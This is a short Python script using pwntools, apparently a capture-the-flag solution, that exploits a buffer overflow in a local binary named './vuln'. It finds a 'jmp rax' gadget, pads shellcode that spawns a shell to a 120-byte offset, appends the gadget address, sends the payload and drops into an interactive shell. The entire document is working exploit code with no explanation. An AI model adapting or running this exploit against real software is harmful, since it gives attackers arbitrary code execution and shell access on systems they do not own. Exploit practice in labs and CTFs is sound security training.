#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rax = next(elf.search(asm('jmp rax')))

offset = 120

payload = flat(
    asm(shellcraft.sh()).ljust(offset, b'A'),
    jmp_rax
)
p.sendline(payload)

p.interactive()
